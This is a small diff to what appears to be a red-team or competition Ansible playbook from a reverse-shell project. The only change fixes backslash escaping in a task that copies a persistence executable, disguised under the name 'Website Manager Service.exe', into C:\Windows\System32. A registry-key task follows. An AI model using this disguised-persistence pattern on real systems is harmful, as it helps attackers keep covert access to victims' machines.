@@ -89,7 +89,7 @@
     - name: Deploys Persistence Executable
       win_copy:
         src: "~/IIS-Reverse-Shell/Persistence/Website Manager Service.exe"
-        dest: "C:\Windows\System32"
+        dest: "C:\\Windows\\System32"
      
     - name: Creates Competition Variable Registry Key
       win_regedit:
